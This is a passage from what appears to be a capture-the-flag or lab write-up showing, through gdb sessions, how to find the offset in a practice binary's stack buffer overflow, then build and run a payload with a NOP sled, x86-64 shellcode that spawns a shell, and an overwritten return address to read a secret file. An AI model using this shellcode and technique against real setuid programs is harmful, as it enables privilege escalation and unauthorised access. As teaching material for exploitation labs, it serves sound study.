Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print 'A'*160")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.5.x86_64
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005d3 in main ()
(gdb) run $(python -c "print 'A'*162")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print 'A'*162")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGBUS, Bus error.
0x00000000004005d3 in main ()
(gdb) run $(python -c "print 'A'*163")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print 'A'*163")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGILL, Illegal instruction.
0x0000000000400500 in __do_global_dtors_aux ()
(gdb) run $(python -c "print 'A'*164")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print 'A'*164")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400041 in ?? ()
(gdb) run $(python -c "print 'A'*165")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print 'A'*165")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000004141 in ?? ()
(gdb) run $(python -c "print 'A'*168")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print 'A'*168")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000004141414141 in ?? ()
(gdb) run $(python -c "print 'A'*169")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print 'A'*169")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
(gdb) run $(python -c "print 'A'*170")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print 'A'*170")
new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005ab in concat_arg ()
(gdb) quit
A debugging session is active.

        Inferior 1 [process 18988] will be killed.

Quit anyway? (y or n) y
[user1@ip-10-64-146-64 overflow-4]$ 
```

The offset is `162` and the total payload length should be `169`.

We will create our payload as:

- NOP-sledge (Opcode 90), 48 bytes
- Shellcode, 62 bytes
- Padding ('A'), 53 bytes
- Memory address, 6 bytes

Total size: 169 bytes

Next, we check for a memory address to point to

```bash
[user1@ip-10-64-146-64 overflow-4]$ gdb -q ./buffer-overflow-2
Reading symbols from ./buffer-overflow-2...(no debugging symbols found)...done.
(gdb) run $(python -c "print '\x90'*48 + 'S'*62 + 'A'*53 + 'B'*6")
Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c "print '\x90'*48 + 'S'*62 + 'A'*53 + 'B'*6")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.5.x86_64
new word is doggo������������������������������������������������SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
(gdb) x/32gx $rsp-200
0x7fffffffe218: 0x00000000004005a9      0x00007ffff7ffa268
0x7fffffffe228: 0x00007fffffffe646      0x9090906f67676f64
0x7fffffffe238: 0x9090909090909090      0x9090909090909090
0x7fffffffe248: 0x9090909090909090      0x9090909090909090
0x7fffffffe258: 0x9090909090909090      0x5353539090909090
0x7fffffffe268: 0x5353535353535353      0x5353535353535353
0x7fffffffe278: 0x5353535353535353      0x5353535353535353
0x7fffffffe288: 0x5353535353535353      0x5353535353535353
0x7fffffffe298: 0x5353535353535353      0x4141414141535353
0x7fffffffe2a8: 0x4141414141414141      0x4141414141414141
0x7fffffffe2b8: 0x4141414141414141      0x4141414141414141
0x7fffffffe2c8: 0x4141414141414141      0x4141414141414141
0x7fffffffe2d8: 0x0000424242424242      0x00007fffffffe3d8
0x7fffffffe2e8: 0x0000000200000000      0x00000000004005e0
0x7fffffffe2f8: 0x00007ffff7a4d13a      0x00007ffff7dcf788
0x7fffffffe308: 0x00007fffffffe3d8      0x00000002f7b9c708
(gdb) quit
A debugging session is active.

        Inferior 1 [process 19032] will be killed.

Quit anyway? (y or n) y
[user1@ip-10-64-146-64 overflow-4]$ 
```

`0x7fffffffe248` seems like a good choice.

Finally, we exploit

```bash
[user1@ip-10-64-146-64 overflow-4]$ /home/user1/overflow-4/buffer-overflow-2 $(python -c "print '\x90'*48 + '1\xfff\xbf\xeb\x03jqXH\x89\xfe\x0f\x05jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05' + 'A'*53 + '\x50\xe2\xff\xff\xff\x7f'")
new word is doggo������������������������������������������������1�f��jqXH��jhH�/bin///sPH��hri�4$1�V^H�VH��1�j;XAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP����
sh-4.2$ cat secret.txt 
wowanothertime!!
sh-4.2$ exit
exit
[user1@ip-10-64-146-64 overflow-4]$ 
```

Again, note that the `buffer-overflow-2` program is called with its full path!

For additional information, please see the references below.

## References

- [Assembly language - Wikipedia](https://en.wikipedia.org/wiki/Assembly_language)
- [Buffer overflow - Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow)
- [C (programming language) - Wikipedia](https://en.wikipedia.org/wiki/C_(programming_language))
- [de Bruijn sequence - Wikipedia](https://en.wikipedia.org/wiki/De_Bruijn_sequence)
- [Endianness - Wikipedia](https://en.wikipedia.org/wiki/Endianness)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [Managing inputs for payload injection? - Reverse Engineering StackExchange](https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection/13929)
- [passwd(5) - Linux manual page](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [python - Linux manual page](https://linux.die.net/man/1/python)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [Radare2 - Book](https://book.rada.re/)
- [Radare2 - GitHub](https://github.com/radareorg/radare2)
- [Radare2 - Homepage](https://www.radare.org/n/radare2.html)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [Shellcode - Wikipedia](https://en.wikipedia.org/wiki/Shellcode)
- [Stack-based memory allocation - Wikipedia](https://en.wikipedia.org/wiki/Stack-based_memory_allocation)
- [Stack buffer overflow - Wikipedia](https://en.wikipedia.org/wiki/Stack_buffer_overflow)
- [x86-64 - Wikipedia](https://en.wikipedia.org/wiki/X86-64)
- [x86-64 calling conventions - Wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions)
- [x86 assembly language - Wikipedia](https://en.wikipedia.org/wiki/X86_assembly_language)
- [x86 instruction listings - Wikipedia](https://en.wikipedia.org/wiki/X86_instruction_listings)
